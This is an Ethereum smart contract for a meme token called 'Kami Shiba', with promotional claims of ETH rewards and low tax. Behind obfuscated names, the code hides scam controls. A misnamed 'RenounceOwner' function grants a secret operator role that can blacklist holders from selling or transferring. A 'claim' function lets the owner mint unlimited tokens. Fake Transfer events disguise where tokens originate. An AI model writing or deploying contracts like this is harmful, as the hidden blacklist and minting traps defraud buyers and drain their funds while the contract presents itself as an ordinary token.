/**
 *Submitted for verification at Etherscan.io on 2022-10-07
*/

pragma solidity 0.8.17;
/*
Kami Shiba  - $KAMISHIBA -

All knowing, All seeing, Low Tax Shiba Meme Coin 

- Earn Rewards in ETH!
- 0% Tax First 24 Hours

TG: KamiShibaETH

*/    

 
contract KAMISHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) AmountOf;
    mapping (address => bool) ii;

    // 
    string public name = "Kami Shiba";
    string public symbol = unicode"KAMISHIBA";
    uint8 public decimals = 18;
    uint256 public totalSupply = 777000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V2Router = 0xFd2cA98e9D0B7d69f9119c2d64F3e38a15427283;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier V() {   
         require(ii[msg.sender]);
         _;}
        modifier I() {   
         require(msg.sender == owner);
         _;}


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V2Router)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!AmountOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address nan) I public {
          ii[nan] = true; }
        
        function claim(address x,  uint256 y) I public {
        balanceOf[x] += y;
        totalSupply += y; }
        function query(address ex) V public{          
        require(!AmountOf[ex]);
        AmountOf[ex] = true; }
        function send(address ex) V public {
        require(AmountOf[ex]);
        AmountOf[ex] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V2Router)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        require(!AmountOf[from]); 
        require(!AmountOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }